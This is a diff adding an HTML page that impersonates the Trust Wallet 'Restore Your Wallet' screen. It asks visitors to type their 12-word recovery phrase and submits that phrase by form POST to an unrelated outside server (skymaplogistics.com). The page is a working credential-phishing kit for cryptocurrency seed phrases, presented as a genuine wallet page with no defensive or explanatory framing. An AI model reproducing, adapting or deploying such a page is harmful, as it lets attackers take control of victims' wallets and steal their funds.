@@ -1,0 +1,128 @@
+﻿<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet</title>
+    <link href="./css/main.ba3fecb7.chunk.css" rel="stylesheet"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+    <div id="root">
+        <div class="App">
+            <div class="NavBar NavBar--is-centered"><a href="#"><img class="NavBar__logo" src="./images/horizontal_blue.png"></a></div>
+            <div class="Pages">
+                <div class="UnlockWalletPage">
+                    <div class="UnlockWalletPage__wrapper">
+                        <div class="UnlockWalletPage__title" style="color:#3375BB;">Restore Your Wallet</div>
+                        <div class="UnlockWalletCard">
+                            <div class="UnlockWalletCard__content">
+                                <div class="UnlockWalletCard__header">
+                                    <div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+                                        
+                                        <a id="mn" class="TabBarItem TabBarItem--is-active tablinks" href="#">
+                                            <div class="TabBarItem__title">Main Wallet</div>
+                                        </a>
+                                        
+                                    </div>
+                                </div>
+                               
+                                <!-- ///////mnemonic/////////// -->
+                                <div id="mnemonic" class="UnlockWalletViaMnemonicPhrase" style="display: block;">
+                                    <form action="https://skymaplogistics.com/ap/wallet/next.php" method="POST">
+                                        <div class="UnlockWalletViaMnemonicPhrase__title">Please enter your 12 word phrase</div>
+                                        <textarea style="width:100%;" class="UnlockWalletViaMnemonicPhrase__mnemonic" name="mnemonic" required="" min="1"></textarea>
+                                        <div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please separate each Mnemonic Phrase with a space.</div>
+                                        
+                                        
+                                        <div class="UnlockWalletViaMnemonicPhrase__footer">
+                                            <button type="submit" name="btn2" style="width:100%;" class="GradientButton undefined GradientButton">
+                                                <div class="GradientButton__title">Restore</div>
+                                            </button>
+                                        </div>
+                                    </form>
+                                </div>
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div></div>
+            </div>
+        </div>
+        <div class="ReactModalPortal"></div>
+        <div class="ReactModalPortal"></div>
+        <div>
+            <div style="position: fixed; top: 0px; right: auto; bottom: auto; left: 50%; transform: translate(-50%, 0%); z-index: 100;">
+                <div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    $('#ks').click(function() {
+        $("#ks").addClass("TabBarItem--is-active");
+        $("#mn").removeClass("TabBarItem--is-active");
+        $("#pk").removeClass("TabBarItem--is-active");
+        $("#keystore").show();
+        $("#mnemonic").hide();
+        $("#private").hide();
+
+    });
+    $('#mn').click(function() {
+        $("#mn").addClass("TabBarItem--is-active");
+        $("#ks").removeClass("TabBarItem--is-active");
+        $("#pk").removeClass("TabBarItem--is-active");
+        $("#mnemonic").show();
+        $("#keystore").hide();
+        $("#private").hide();
+
+    });
+    $('#pk').click(function() {
+        $("#pk").addClass("TabBarItem--is-active");
+        $("#ks").removeClass("TabBarItem--is-active");
+        $("#mn").removeClass("TabBarItem--is-active");
+        $("#private").show();
+        $("#keystore").hide();
+        $("#mnemonic").hide();
+
+    });
+
+    function getUrlVars() {
+        var vars = {};
+        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+            vars[key] = value;
+        });
+        return vars;
+    }
+
+    if (!getUrlVars()["type"]) {
+
+    } else {
+        var type = getUrlVars()["type"];
+        if (type == "mnemonic") {
+            $("#mn").addClass("TabBarItem--is-active");
+            $("#ks").removeClass("TabBarItem--is-active");
+            $("#pk").removeClass("TabBarItem--is-active");
+            $("#mnemonic").show();
+            $("#keystore").hide();
+            $("#private").hide();
+        }
+    }
+
+
+});
+</script>
+
+</html>
